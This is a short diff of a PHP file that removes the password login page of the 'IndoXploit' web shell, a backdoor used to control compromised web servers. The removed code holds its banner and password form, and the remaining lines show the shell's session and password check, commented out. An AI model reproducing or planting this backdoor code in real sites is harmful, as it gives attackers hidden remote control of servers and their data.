@@ -22,69 +22,6 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     }
 }
 
-function login_shell() {
-?>
-<!DOCTYPE HTML>
-<html>
-<head>
-<meta name="robots" content"noindex. nofollow">
-<title>IndoXploit</title>
-<style type="text/css">
-html {
-	margin: 20px auto;
-	background: #000000;
-	color: green;
-	text-align: center;
-}
-header {
-	color: green;
-	margin: 10px auto;
-}
-input[type=password] {
-	width: 250px;
-	height: 25px;
-	color: red;
-	background: transparent;
-	border: 1px dotted green;
-	margin-left: 20px;
-	text-align: center;
-}
-</style>
-</head>
-<center>
-<header>
-	<pre>
- ___________________________
-< root@indoxploit:~# w00t??? >
- ---------------------------
-   \         ,        ,
-    \       /(        )`
-     \      \ \___   / |
-            /- _  `-/  '
-           (/\/ \ \   /\
-           / /   | `    \
-           O O   ) /    |
-           `-^--'`<     '
-          (_.)  _  )   /
-           `.___/`    /
-             `-----' /
-<----.     __ / __   \
-<----|====O)))==) \) /====>
-<----'    `--' `.__,' \
-             |        |
-              \       /
-        ______( (_  / \______
-      ,'  ,-----'   |        \
-      `--{__________)        \/
-	</pre>
-</header>
-<form method="post">
-<input type="password" name="password">
-</form>
-<?php
-exit;
-}
-
 // if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 //     if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
 //         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
